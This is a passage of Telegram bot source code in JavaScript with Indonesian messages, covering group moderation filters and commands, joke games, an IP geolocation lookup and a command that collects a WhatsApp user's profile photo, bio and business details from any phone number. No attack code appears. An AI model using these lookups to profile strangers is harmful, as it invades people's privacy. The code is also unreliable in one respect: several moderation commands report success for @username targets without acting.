        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

// =======[ CASS MSG SECURITY ] =======\\
bot.on("message", async (ctx, next) => {
  const msg = ctx.message;
  if (!msg) return next();

  if (ctx.chat.type === "private") return next();

  const isForward =
    msg.forward_from ||
    msg.forward_from_chat ||
    msg.forward_date;

  const isMedia =
    msg.photo ||
    msg.video;

  const text = msg.text || msg.caption || "";
  const isLink = /(link|https|http|t.me|https:|https?:\/\/|t\.me\/|wa\.me\/|chat\.whatsapp\.com)/gi.test(text);

  const isPromosi = /(open|jasa|fs|forsale|acc|panel|vps|murah|promo|diskon|sewa|panel|nokos|sc|script|buy|sell|ready|order|admin panel|hosting|domain|murmer|join|reseller|pt|private|public)/i.test(text);

  const isPorno = /(bokep|ktl|jmbt|jmbot|mmk|kntol|tobrut|pulen|sange|porno|sex|ngentot|memek|kontol|sange|colmek|coli|xnxx|pornhub|xvideo|jav|hentai|bigo|onlyfans)/i.test(text);

  const antiForward = loadAntiForward().enabled;
  const antiAdmin = loadAntiAdmin().enabled;
  const antiMediaDB = loadAntiMedia(); // { enabled, mode }
  const antiPromosi = loadAntiPromosi().enabled;
  const antiLink = loadAntiLink().enabled;
  const antiPorno = loadAntiPorno().enabled;

  const admin = await isAdmin(ctx);

  if (isForward) {
    if (antiForward) {
      try { await ctx.deleteMessage(); } catch {}
      return;
    }

    if (antiAdmin && admin) {
      try { await ctx.deleteMessage(); } catch {}
      return;
    }
  }

  if (isMedia && antiMediaDB.enabled) {

    if (antiMediaDB.mode === "all") {
      try { await ctx.deleteMessage(); } catch {}
      return;
    }

    if (antiMediaDB.mode === "admin" && admin) {
      try { await ctx.deleteMessage(); } catch {}
      return;
    }
  }

  if (isLink && antiLink) {
    try { await ctx.deleteMessage(); } catch {}
    return;
  }
  
  if (isPromosi && antiPromosi) {
    try { await ctx.deleteMessage(); } catch {}
   return;
  }

  if (isPorno && antiPorno) {
    try { await ctx.deleteMessage(); } catch {}
   return;
  }
  
  return next();
});

///============[ END MENU ]=========\\
bot.command("antiporno", async (ctx) => {
  if (ctx.from.id != OWNER_ID)
    return ctx.reply("❌ Khusus owner");

  const args = ctx.message.text.split(" ")[1];
  let db = loadAntiPorno();

  if (!args)
    return ctx.reply(`⚙️ Anti Porno: ${db.enabled ? "ON ✅" : "OFF ❌"}`);

  if (args === "on") {
    db.enabled = true;
    saveAntiPorno(db);
    return ctx.reply("🚫 Anti Porno ON");
  }

  if (args === "off") {
    db.enabled = false;
    saveAntiPorno(db);
    return ctx.reply("✅ Anti Porno OFF");
  }

  ctx.reply("Format: /antiporno on / off");
});

bot.command("antipromosi", async (ctx) => {
  if (ctx.from.id != OWNER_ID)
    return ctx.reply("❌ Khusus owner");

  const args = ctx.message.text.split(" ")[1];
  let db = loadAntiPromosi();

  if (!args)
    return ctx.reply(`⚙️ Anti Promosi: ${db.enabled ? "ON ✅" : "OFF ❌"}`);

  if (args === "on") {
    db.enabled = true;
    saveAntiPromosi(db);
    return ctx.reply("✅ Anti Promosi ON");
  }

  if (args === "off") {
    db.enabled = false;
    saveAntiPromosi(db);
    return ctx.reply("❌ Anti Promosi OFF");
  }

  ctx.reply("Format: /antipromosi on / off");
});

bot.command("antilink", async (ctx) => {
  if (ctx.from.id != OWNER_ID)
    return ctx.reply("❌ Khusus owner");

  const args = ctx.message.text.split(" ")[1];
  let db = loadAntiLink();

  if (!args)
    return ctx.reply(`⚙️ Anti Link: ${db.enabled ? "ON ✅" : "OFF ❌"}`);

  if (args === "on") {
    db.enabled = true;
    saveAntiLink(db);
    return ctx.reply("✅ Anti Link ON");
  }

  if (args === "off") {
    db.enabled = false;
    saveAntiLink(db);
    return ctx.reply("❌ Anti Link OFF");
  }

  ctx.reply("Format: /antilink on / off");
});

bot.command("antimedia", async (ctx) => {
  if (ctx.from.id != OWNER_ID)
    return ctx.reply("❌ Khusus owner");

  const args = ctx.message.text.split(" ")[1];
  let db = loadAntiMedia();

  if (!args) {
    return ctx.reply(
      `⚙️ Anti Media: ${db.enabled ? "ON ✅" : "OFF ❌"}\nMode: ${db.mode}`
    );
  }

  if (args === "on") {
    db.enabled = true;
    db.mode = "all";
    saveAntiMedia(db);
    return ctx.reply("✅ Anti Media ON (semua user)");
  }

  if (args === "off") {
    db.enabled = false;
    saveAntiMedia(db);
    return ctx.reply("❌ Anti Media OFF");
  }

  if (args === "admin") {
    db.enabled = true;
    db.mode = "admin";
    saveAntiMedia(db);
    return ctx.reply("👑 Anti Media khusus ADMIN aktif");
  }

  ctx.reply("Format:\n/antimedia on\n/antimedia off\n/antimedia admin");
});

bot.command("antiforward", async (ctx) => {
  if (ctx.from.id != OWNER_ID)
    return ctx.reply("❌ Khusus owner");

  const args = ctx.message.text.split(" ")[1];
  let db = loadAntiForward();

  if (!args)
    return ctx.reply(`⚙️ Anti Forward: ${db.enabled ? "ON ✅" : "OFF ❌"}`);

  if (args === "on") {
    db.enabled = true;
    saveAntiForward(db);
    return ctx.reply("✅ Anti Forward ON");
  }

  if (args === "off") {
    db.enabled = false;
    saveAntiForward(db);
    return ctx.reply("❌ Anti Forward OFF");
  }

  ctx.reply("Format: /antiforward on / off");
});


// Anti Admin
bot.command("antiadmin", async (ctx) => {
  if (ctx.from.id != OWNER_ID)
    return ctx.reply("❌ Khusus owner");

  const args = ctx.message.text.split(" ")[1];
  let db = loadAntiAdmin();

  if (!args)
    return ctx.reply(`⚙️ Anti Admin: ${db.enabled ? "ON ✅" : "OFF ❌"}`);

  if (args === "on") {
    db.enabled = true;
    saveAntiAdmin(db);
    return ctx.reply("✅ Anti Admin ON");
  }

  if (args === "off") {
    db.enabled = false;
    saveAntiAdmin(db);
    return ctx.reply("❌ Anti Admin OFF");
  }

  ctx.reply("Format: /antiadmin on / off");
});

// ======[ CASE GROUP MENU ]======\\
bot.command("tagall", async (ctx) => {

  const text =
    ctx.message.text.split(" ").slice(1).join(" ");

  // JIKA TIDAK ADA TEKS
  if (!text) {

    return ctx.reply(
`<blockquote>
❌ Masukkan teks

📌 Example:
⌑ /tagall Halo bang
</blockquote>`,
{
  parse_mode: "HTML"
});

  }

  // TANGGAL SEKARANG
  const tanggal =
    new Date().toLocaleDateString("id-ID", {
      day: "numeric",
      month: "long",
      year: "numeric"
    });

  // HASIL
  ctx.reply(
`<blockquote>
📅 TANGGAL HARI INI

📝 Teks : ${text}
📆 Date : ${tanggal}
</blockquote>`,
{
  parse_mode: "HTML"
});

});

const WARN_FILE = "./Security/warn.json";

function loadWarn() {

  if (!fs.existsSync(WARN_FILE)) {

    fs.writeFileSync(
      WARN_FILE,
      JSON.stringify({})
    );

  }

  return JSON.parse(
    fs.readFileSync(WARN_FILE)
  );

}

function saveWarn(data) {

  fs.writeFileSync(
    WARN_FILE,
    JSON.stringify(data, null, 2)
  );

}

bot.command("warn", async (ctx) => {

  if (ctx.chat.type === "private") {

    return ctx.reply(
`<blockquote>
❌ Command hanya untuk grup
</blockquote>`,
{
  parse_mode: "HTML"
});

  }

  const member =
    await ctx.telegram.getChatMember(
      ctx.chat.id,
      ctx.from.id
    );

  if (
    member.status !== "administrator" &&
    member.status !== "creator"
  ) {

    return ctx.reply(
`<blockquote>
❌ Khusus admin grup
</blockquote>`,
{
  parse_mode: "HTML"
});

  }

  let targetId;
  let targetName;

  // REPLY TARGET
  if (ctx.message.reply_to_message) {

    const target =
      ctx.message.reply_to_message.from;

    targetId = target.id;
    targetName = target.first_name;

  } else {

    return ctx.reply(
`<blockquote>
❌ Reply target

📌 Example:
Reply target lalu /warn
</blockquote>`,
{
  parse_mode: "HTML"
});

  }

  // LOAD DB
  const warns = loadWarn();

  const key =
`${ctx.chat.id}_${targetId}`;

  if (!warns[key]) {

    warns[key] = 0;

  }

  // TAMBAH WARN
  warns[key] += 1;

  saveWarn(warns);

  const totalWarn =
    warns[key];

  // WARN 1
  if (totalWarn === 1) {

    return ctx.reply(
`<blockquote>
⚠️ PERINGATAN 1X

👤 Target : ${targetName}
</blockquote>`,
{
  parse_mode: "HTML"
});

  }

  // WARN 2
  if (totalWarn === 2) {

    return ctx.reply(
`<blockquote>
⚠️ PERINGATAN 2X

👤 Target : ${targetName}
</blockquote>`,
{
  parse_mode: "HTML"
});

  }

  // WARN 3 = BAN
  if (totalWarn >= 3) {

    await ctx.telegram.banChatMember(
      ctx.chat.id,
      targetId
    );

    delete warns[key];

    saveWarn(warns);

    return ctx.reply(
`<blockquote>
🚫 USER TERBANNED

👤 Target : ${targetName}
⚠️ Peringatan : 3X
</blockquote>`,
{
  parse_mode: "HTML"
});

  }

});

bot.command("mute", async (ctx) => {

  // KHUSUS GROUP
  if (ctx.chat.type === "private") {

    return ctx.reply(
`<blockquote>
❌ Command hanya untuk grup
</blockquote>`,
{
  parse_mode: "HTML"
});

  }

  // CEK ADMIN
  const member = await ctx.telegram.getChatMember(
    ctx.chat.id,
    ctx.from.id
  );

  if (
    member.status !== "administrator" &&
    member.status !== "creator"
  ) {

    return ctx.reply(
`<blockquote>
❌ Khusus admin grup
</blockquote>`,
{
  parse_mode: "HTML"
});

  }

  let targetId;
  let targetName;

  // REPLY TARGET
  if (ctx.message.reply_to_message) {

    const target =
      ctx.message.reply_to_message.from;

    targetId = target.id;
    targetName = target.first_name;

  }

  // USERNAME TARGET
  else {

    const args =
      ctx.message.text.split(" ")[1];

    if (!args || !args.startsWith("@")) {

      return ctx.reply(
`<blockquote>
❌ Cara penggunaan salah

📌 Example:
⌑ Reply target lalu /mute
⌑ /mute @username
</blockquote>`,
{
  parse_mode: "HTML"
});

    }

    targetName = args;

  }

  // MUTE USER
  if (targetId) {

    await ctx.telegram.restrictChatMember(
      ctx.chat.id,
      targetId,
      {
        permissions: {
          can_send_messages: false
        }
      }
    );

  }

  // RESULT
  ctx.reply(
`<blockquote>
🔇 MUTE SUCCESS

👤 Target : ${targetName}
✅ Status : Berhasil dimute
</blockquote>`,
{
  parse_mode: "HTML"
});

});

bot.command("unmute", async (ctx) => {

  // KHUSUS GROUP
  if (ctx.chat.type === "private") {

    return ctx.reply(
`<blockquote>
❌ Command hanya untuk grup
</blockquote>`,
{
  parse_mode: "HTML"
});

  }

  // CEK ADMIN
  const member = await ctx.telegram.getChatMember(
    ctx.chat.id,
    ctx.from.id
  );

  if (
    member.status !== "administrator" &&
    member.status !== "creator"
  ) {

    return ctx.reply(
`<blockquote>
❌ Khusus admin grup
</blockquote>`,
{
  parse_mode: "HTML"
});

  }

  let targetId;
  let targetName;

  // REPLY TARGET
  if (ctx.message.reply_to_message) {

    const target =
      ctx.message.reply_to_message.from;

    targetId = target.id;
    targetName = target.first_name;

  }

  // USERNAME TARGET
  else {

    const args =
      ctx.message.text.split(" ")[1];

    if (!args || !args.startsWith("@")) {

      return ctx.reply(
`<blockquote>
❌ Cara penggunaan salah

📌 Example:
⌑ Reply target lalu /unmute
⌑ /unmute @username
</blockquote>`,
{
  parse_mode: "HTML"
});

    }

    targetName = args;

  }

  // UNMUTE USER
  if (targetId) {

    await ctx.telegram.restrictChatMember(
      ctx.chat.id,
      targetId,
      {
        permissions: {
          can_send_messages: true,
          can_send_media_messages: true,
          can_send_polls: true,
          can_send_other_messages: true,
          can_add_web_page_previews: true
        }
      }
    );

  }

  // RESULT
  ctx.reply(
`<blockquote>
🔊 UNMUTE SUCCESS

👤 Target : ${targetName}
✅ Status : Berhasil diunmute
</blockquote>`,
{
  parse_mode: "HTML"
});

});

bot.command("open", async (ctx) => {

  // KHUSUS GROUP
  if (ctx.chat.type === "private") {

    return ctx.reply(
`<blockquote>
❌ Command hanya untuk grup
</blockquote>`,
{
  parse_mode: "HTML"
});

  }

  // CEK ADMIN
  const member = await ctx.telegram.getChatMember(
    ctx.chat.id,
    ctx.from.id
  );

  if (
    member.status !== "administrator" &&
    member.status !== "creator"
  ) {

    return ctx.reply(
`<blockquote>
❌ Khusus admin grup
</blockquote>`,
{
  parse_mode: "HTML"
});

  }

  // OPEN GROUP
  await ctx.telegram.setChatPermissions(
    ctx.chat.id,
    {
      can_send_messages: true,
      can_send_media_messages: true,
      can_send_polls: true,
      can_send_other_messages: true,
      can_add_web_page_previews: true,
      can_change_info: false,
      can_invite_users: true,
      can_pin_messages: false
    }
  );

  ctx.reply(
`<blockquote>
✅ Grup berhasil dibuka
</blockquote>`,
{
  parse_mode: "HTML"
});

});

bot.command("close", async (ctx) => {

  // KHUSUS GROUP
  if (ctx.chat.type === "private") {

    return ctx.reply(
`<blockquote>
❌ Command hanya untuk grup
</blockquote>`,
{
  parse_mode: "HTML"
});

  }

  // CEK ADMIN
  const member = await ctx.telegram.getChatMember(
    ctx.chat.id,
    ctx.from.id
  );

  if (
    member.status !== "administrator" &&
    member.status !== "creator"
  ) {

    return ctx.reply(
`<blockquote>
❌ Khusus admin grup
</blockquote>`,
{
  parse_mode: "HTML"
});

  }

  // CLOSE GROUP
  await ctx.telegram.setChatPermissions(
    ctx.chat.id,
    {
      can_send_messages: false
    }
  );

  ctx.reply(
`<blockquote>
🔒 Grup berhasil ditutup
</blockquote>`,
{
  parse_mode: "HTML"
});

});

bot.command("unban", async (ctx) => {

  // KHUSUS GROUP
  if (ctx.chat.type === "private") {

    return ctx.reply(
`<blockquote>
❌ Command hanya bisa digunakan di grup
</blockquote>`,
{
  parse_mode: "HTML"
});

  }

  // CEK ADMIN
  const member = await ctx.telegram.getChatMember(
    ctx.chat.id,
    ctx.from.id
  );

  if (
    member.status !== "administrator" &&
    member.status !== "creator"
  ) {

    return ctx.reply(
`<blockquote>
❌ Khusus admin grup
</blockquote>`,
{
  parse_mode: "HTML"
});

  }

  let targetId;
  let targetName;

  // JIKA REPLY
  if (ctx.message.reply_to_message) {

    const target =
      ctx.message.reply_to_message.from;

    targetId = target.id;
    targetName = target.first_name;

  }

  // JIKA USERNAME
  else {

    const args =
      ctx.message.text.split(" ")[1];

    if (!args || !args.startsWith("@")) {

      return ctx.reply(
`<blockquote>
❌ Cara penggunaan salah

📌 Example:
⌑ Reply target lalu /unban
⌑ /unban @username
</blockquote>`,
{
  parse_mode: "HTML"
});

    }

    targetName = args;

  }

  // UNBAN USER
  if (targetId) {

    await ctx.telegram.unbanChatMember(
      ctx.chat.id,
      targetId
    );

  }

  // RESULT
  ctx.reply(
`<blockquote>
✅ UNBAN SUCCESS

👤 Target : ${targetName}
🔓 Status : Berhasil diunban
</blockquote>`,
{
  parse_mode: "HTML"
});

});

bot.command("ban", async (ctx) => {

  // KHUSUS GROUP
  if (ctx.chat.type === "private") {

    return ctx.reply(
`<blockquote>
❌ Command hanya bisa digunakan di grup
</blockquote>`,
{
  parse_mode: "HTML"
});

  }

  // CEK ADMIN
  const member = await ctx.telegram.getChatMember(
    ctx.chat.id,
    ctx.from.id
  );

  if (
    member.status !== "administrator" &&
    member.status !== "creator"
  ) {

    return ctx.reply(
`<blockquote>
❌ Khusus admin grup
</blockquote>`,
{
  parse_mode: "HTML"
});

  }

  let targetId;
  let targetName;

  // JIKA REPLY
  if (ctx.message.reply_to_message) {

    const target =
      ctx.message.reply_to_message.from;

    targetId = target.id;
    targetName = target.first_name;

  }

  // JIKA USERNAME
  else {

    const args =
      ctx.message.text.split(" ")[1];

    if (!args || !args.startsWith("@")) {

      return ctx.reply(
`<blockquote>
❌ Cara penggunaan salah

📌 Example:
⌑ Reply target lalu /ban
⌑ /ban @username
</blockquote>`,
{
  parse_mode: "HTML"
});

    }

    targetName = args;

  }

  // CEK ADMIN TARGET JIKA REPLY
  if (targetId) {

    const targetMember =
      await ctx.telegram.getChatMember(
        ctx.chat.id,
        targetId
      );

    if (
      targetMember.status === "administrator" ||
      targetMember.status === "creator"
    ) {

      return ctx.reply(
`<blockquote>
❌ Tidak bisa ban admin grup
</blockquote>`,
{
  parse_mode: "HTML"
});

    }

    // BAN USER
    await ctx.telegram.banChatMember(
      ctx.chat.id,
      targetId
    );

  }

  // RESULT
  ctx.reply(
`<blockquote>
🔨 BAN SUCCESS

👤 Target : ${targetName}
✅ Status : Berhasil dibanned
</blockquote>`,
{
  parse_mode: "HTML"
});

});

// ======[ CONST GAMES ]======\\
const slotGame = {};
const bombGame = {};

// ======[ END CONST ]======\\

// ======== [ GAME'S MENU ] ========\\
bot.command("cekganteng", async (ctx) => {
  const user = ctx.message.reply_to_message
    ? ctx.message.reply_to_message.from.first_name
    : ctx.from.first_name;

  const persen = Math.floor(Math.random() * 101);

  let status = "";
  if (persen < 30) status = "Jelek Dekil Lu 😹";
  else if (persen < 60) status = "Lumayan lah 😌";
  else if (persen < 85) status = "Ganteng 😎";
  else status = "GANTENG MAXX 🔥🗿";

  const teks = `
<blockquote><pre> C E K  G A N T E N G</pre></blockquote>

👤 Target : ${user}
📊 Tingkat : ${persen}%

✨ Status : ${status}

<blockquote><i>Scan wajah tanpa kamera HD...</i></blockquote>
`;

  await ctx.reply("🔍 Sedang scan ketampanan...");
  setTimeout(() => {
    ctx.reply(teks, { parse_mode: "HTML" });
  }, 2000);
});

bot.command("cekkantik", async (ctx) => {
  const user = ctx.message.reply_to_message
    ? ctx.message.reply_to_message.from.first_name
    : ctx.from.first_name;

  const persen = Math.floor(Math.random() * 101);

  let status = "";
  if (persen < 30) status = "Masih latihan 😅";
  else if (persen < 60) status = "Lumayan ✨";
  else if (persen < 85) status = "Cantik 😍";
  else status = "SULTAN AURA CANTIK 💅🔥";

  const teks = `
<blockquote><pre>C E K  C A N T I K</pre></blockquote>

👤 Target : ${user}
💖 Tingkat : ${persen}%

✨ Status : ${status}

<blockquote><i>Scan wajah selesai tanpa filter...</i></blockquote>
`;

  await ctx.reply("🔍 Sedang scan kecantikan...");
  setTimeout(() => {
    ctx.reply(teks, { parse_mode: "HTML" });
  }, 2000);
});

bot.command("cekkhodam", async (ctx) => {
  const target = ctx.message.reply_to_message 
    ? ctx.message.reply_to_message.from.first_name 
    : ctx.from.first_name;

  const khodamList = [
    "Rawa Rontek",
    "Macan jembut Pink",
    "Bahlil Hitam",
    "Gondog Sumik",
    "Ga tau",
    "Siluman Ular Emas 🐍",
    "Jin Kopi Sachet ☕",
    "Raja Iblis Mode Hemat 😆",
    "Tuyul Freelance 💰",
    "Kosong (Belum Install Khodam) 🚫"
  ];

  const result = khodamList[Math.floor(Math.random() * khodamList.length)];

  const teks = `
<blockquote><pre> C E K  K H O D A M</pre></blockquote>

👤 Target : ${target}
🧿 Khodam : ${result}

📊 Status : ${result.includes("Kosong") ? "Tidak terdeteksi ❌" : "Aktif ✅"}

<blockquote><i>Scan selesai tanpa gangguan dimensi lain...</i></blockquote>
`;

  ctx.reply(teks, { parse_mode: "HTML" });
});

bot.command("bomb", async (ctx) => {

  const chatId = ctx.chat.id;

  const bomb = Math.floor(Math.random() * 5) + 1;

  bombGame[chatId] = bomb;

  await ctx.reply(`<blockquote>
💣 GAME BOM PILIH ANGKA

Pilih salah satu angka di bawah.
Jangan sampai kena BOM 💀

🎁 Hadiah : Selamat Hidup
💀 Hukuman : Kena Bom
</blockquote>`,
{
  parse_mode: "HTML",

  reply_markup: {
    inline_keyboard: [
      [
        { text: "1️⃣", callback_data: "bomb_1", style: "danger" },
        { text: "2️⃣", callback_data: "bomb_2", style: "danger" }
      ],
      [
        { text: "3️⃣", callback_data: "bomb_3", style: "primary" }
      ],
      [
        { text: "4️⃣", callback_data: "bomb_4", style: "danger" },
        { text: "5️⃣", callback_data: "bomb_5", style: "danger" }
      ]
    ]
  }
}
  );
});

bot.command("slot", async (ctx) => {
  const userId = ctx.from.id;

  if (slotGame[userId]) {
    return ctx.reply("<blockquote>❌ Kamu masih bermain!</blockquote>", { parse_mode: "HTML" });
  }

  slotGame[userId] = true;

  return ctx.reply(
`<blockquote>🎰 SLOT MACHINE

Klik tombol untuk mulai spin!</blockquote>`,
  {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🎰 SPIN", callback_data: "slot_spin", style: "primary" }]
      ]
    }
  });
});

const delay = (ms) => new Promise(res => setTimeout(res, ms));

bot.action("slot_spin", async (ctx) => {
  await ctx.answerCbQuery();

  const userId = ctx.from.id;

  if (!slotGame[userId]) {
    return ctx.answerCbQuery("❌ Tidak ada game!");
  }

  const symbols = ["🍒", "🍋", "🍉", "⭐", "💎"];

  // animasi awal
  let msg;
  try {
    msg = await ctx.editMessageText(
      `<blockquote>🎰 SPINNING...

[ ❓ | ❓ | ❓ ]</blockquote>`,
      { parse_mode: "HTML" }
    );
  } catch {}

  // efek roll 1
  await delay(500);
  let s1 = symbols[Math.floor(Math.random() * symbols.length)];
  try {
    await ctx.editMessageText(
      `<blockquote>🎰 SPINNING...

[ ${s1} | ❓ | ❓ ]</blockquote>`,
      { parse_mode: "HTML" }
    );
  } catch {}

  // efek roll 2
  await delay(700);
  let s2 = symbols[Math.floor(Math.random() * symbols.length)];
  try {
    await ctx.editMessageText(
      `<blockquote>🎰 SPINNING...

[ ${s1} | ${s2} | ❓ ]</blockquote>`,
      { parse_mode: "HTML" }
    );
  } catch {}

  // efek roll 3
  await delay(900);
  let s3 = symbols[Math.floor(Math.random() * symbols.length)];

  // hasil akhir
  let result = "";
  if (s1 === s2 && s2 === s3) {
    result = "🎉 JACKPOT!";
  } else if (s1 === s2 || s2 === s3 || s1 === s3) {
    result = "✨ Hampir menang!";
  } else {
    result = "💀 Zonkk!";
  }

  delete slotGame[userId];

  try {
    await ctx.editMessageText(
`<blockquote>🎰 SLOT RESULT

[ ${s1} | ${s2} | ${s3} ]

${result}</blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🔄 MAIN LAGI", callback_data: "slot_play_again", style: "success" }]
          ]
        }
      }
    );
  } catch {}
});

bot.action(/bomb_(\d+)/, async (ctx) => {

  const chatId = ctx.chat.id;

  const pilih = Number(ctx.match[1]);

  const bomb = bombGame[chatId];

  if (!bomb) {
    return ctx.answerCbQuery("Game sudah selesai");
  }

  if (pilih === bomb) {

    delete bombGame[chatId];

    await ctx.editMessageText(
`💣 BOOM !!

❌ Kamu memilih angka ${pilih}

☠️ Kamu terkena BOM
🎮 Game selesai`
    );

    return ctx.answerCbQuery("💣 KENA BOM");
  }

  delete bombGame[chatId];

  await ctx.editMessageText(
`🎉 SELAMAT !!

✅ Kamu memilih angka ${pilih}

💣 Bom berada di angka ${bomb}

🏆 Kamu selamat dari BOM`
  );

  return ctx.answerCbQuery("🎉 Selamat");
});

bot.action("slot_play_again", async (ctx) => {
  await ctx.answerCbQuery();

  const userId = ctx.from.id;
  slotGame[userId] = true;

  return ctx.editMessageText(
`<blockquote>🎰 SLOT MACHINE

Klik tombol untuk spin lagi!</blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🎰 SPIN", callback_data: "slot_spin", style: "danger" }]
        ]
      }
    }
  );
});
//=========[ END ]=========\\
bot.command("trackip", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").filter(Boolean);
  if (!args[1]) return ctx.reply("🪧 ☇ Format: /trackip 8.8.8.8");

  const ip = args[1].trim();

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every(p => {
      if (!/^\d{1,3}$/.test(p)) return false;
      if (p.length > 1 && p.startsWith("0")) return false; // hindari "01"
      const n = Number(p);
      return n >= 0 && n <= 255;
    });
  }

  function isValidIPv6(ip) {
    const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
    return ipv6Regex.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return ctx.reply("❌ ☇ IP tidak valid masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar");
  }

  let processingMsg = null;
  try {
  processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`, {
    parse_mode: "HTML"
  });
} catch (e) {
    processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`);
  }

  try {
    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 10000 });
    const data = res.data;

    if (!data || data.success === false) {
      return await ctx.reply(`❌ ☇ Gagal mendapatkan data untuk IP: ${ip}`);
    }

    const lat = data.latitude || "";
    const lon = data.longitude || "";
    const mapsUrl = lat && lon ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + ',' + lon)}` : null;

    const caption = `
<blockquote><pre>⬡═―—⊱ ⎧ 𝑺𝒊𝒍𝒆𝒏𝒕 𝑲𝒊𝒍𝒍𝒆𝒓 𝑩𝒖𝒈 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ IP: ${data.ip || "-"}
⌑ Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
⌑ Region: ${data.region || "-"}
⌑ City: ${data.city || "-"}
⌑ ZIP: ${data.postal || "-"}
⌑ Timezone: ${data.timezone_gmt || "-"}
⌑ ISP: ${data.isp || "-"}
⌑ Org: ${data.org || "-"}
⌑ ASN: ${data.asn || "-"}
⌑ Lat/Lon: ${lat || "-"}, ${lon || "-"}
`.trim();

    const inlineKeyboard = mapsUrl ? {
      reply_markup: {
        inline_keyboard: [
          [{ text: "⌜🌍⌟ ☇ オープンロケーション", url: mapsUrl }]
        ]
      }
    } : null;

    try {
      if (processingMsg && processingMsg.photo && typeof processingMsg.message_id !== "undefined") {
        await ctx.telegram.editMessageCaption(
          processingMsg.chat.id,
          processingMsg.message_id,
          undefined,
          caption,
          { parse_mode: "HTML", ...(inlineKeyboard ? inlineKeyboard : {}) }
        );
      } else if (typeof thumbnailUrl !== "undefined" && thumbnailUrl) {
        await ctx.replyWithPhoto(thumbnailUrl, {
          caption,
          parse_mode: "HTML",
          ...(inlineKeyboard ? inlineKeyboard : {})
        });
      } else {
        if (inlineKeyboard) {
          await ctx.reply(caption, { parse_mode: "HTML", ...inlineKeyboard });
        } else {
          await ctx.reply(caption, { parse_mode: "HTML" });
        }
      }
    } catch (e) {
      if (mapsUrl) {
        await ctx.reply(caption + `📍 ☇ Maps: ${mapsUrl}`, { parse_mode: "HTML" });
      } else {
        await ctx.reply(caption, { parse_mode: "HTML" });
      }
    }

  } catch (err) {
    await ctx.reply("❌ ☇ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti");
  }
});

bot.command("cekkontak", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("👀 ☇ Format: /cekkontak 62×××\nContoh: /cekkontak 628123456789");
    }

    const number = args[1];
    const cleanNumber = number.replace(/[^0-9]/g, '');
    const target = cleanNumber + "@s.whatsapp.net";

    const processMsg = await ctx.reply("⏳ ☇ Memeriksa kontak WhatsApp...");

    try {
        // Cek apakah nomor terdaftar di WhatsApp
        const contactCheck = await sock.onWhatsApp(target);
        
        if (!contactCheck || contactCheck.length === 0) {
            await ctx.editMessageText(
                `❌ ☇ Nomor ${number} tidak terdaftar di WhatsApp`,
                { chat_id: ctx.chat.id, message_id: processMsg.message_id }
            );
            return;
        }

        const contact = contactCheck[0];
        
        // Dapatkan info profil lengkap
        let profilePicture = null;
        let status = null;
        let businessProfile = null;

        try {
            profilePicture = await sock.profilePictureUrl(target, 'image').catch(() => null);
        } catch (e) {}

        try {
            status = await sock.fetchStatus(target).catch(() => null);
        } catch (e) {}

        try {
            businessProfile = await sock.getBusinessProfile(target).catch(() => null);
        } catch (e) {}

        // Format hasil
        let contactInfo = `<blockquote><b>⬡═―—⊱ ⎧ WHATSAPP CONTACT INFO ⎭ ⊰―—═⬡</b></blockquote>\n\n`;
        
        contactInfo += `📱 <b>Informasi Kontak</b>\n\n`;
        contactInfo += `🔢 <b>Nomor:</b> +${cleanNumber}\n`;
        contactInfo += `✅ <b>Status WhatsApp:</b> Terdaftar\n`;
        
        if (contact.exists) {
            contactInfo += `🟢 <b>Akun Aktif:</b> Ya\n`;
        }

        if (status) {
            contactInfo += `📝 <b>Status/Bio:</b> ${status.status || 'Tidak ada'}\n`;
            if (status.setAt) {
                contactInfo += `⏰ <b>Status Diubah:</b> ${new Date(status.setAt).toLocaleString('id-ID')}\n`;
            }
        }

        if (businessProfile) {
            contactInfo += `🏢 <b>Akun Bisnis:</b> Ya\n`;
            contactInfo += `📊 <b>Kategori:</b> ${businessProfile.categories?.[0]?.name || 'Tidak diketahui'}\n`;
            contactInfo += `📋 <b>Deskripsi:</b> ${businessProfile.description || 'Tidak ada'}\n`;
            
            if (businessProfile.email) {
                contactInfo += `📧 <b>Email:</b> ${businessProfile.email}\n`;
            }
            if (businessProfile.website) {
                contactInfo += `🌐 <b>Website:</b> ${businessProfile.website}\n`;
            }
            if (businessProfile.address) {
                contactInfo += `📍 <b>Alamat:</b> ${businessProfile.address}\n`;
            }
        }

        contactInfo += `\n🖼 <b>Foto Profil:</b> ${profilePicture ? 'Tersedia' : 'Tidak tersedia'}\n`;
        contactInfo += `📞 <b>Chat:</b> <a href="https://wa.me/${cleanNumber}">Klik di sini</a>\n`;

        // Kirim hasil
        if (profilePicture) {
            await ctx.replyWithPhoto(profilePicture, {
                caption: contactInfo,
                parse_mode: "HTML",
